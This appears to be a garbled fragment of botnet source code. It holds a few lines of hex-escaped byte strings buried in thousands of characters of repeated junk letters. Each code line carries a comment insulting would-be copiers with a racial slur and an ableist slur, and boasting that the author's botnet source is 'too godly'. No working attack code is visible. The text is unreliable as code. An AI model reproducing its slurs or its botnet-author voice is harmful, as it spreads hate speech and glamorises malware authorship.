98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9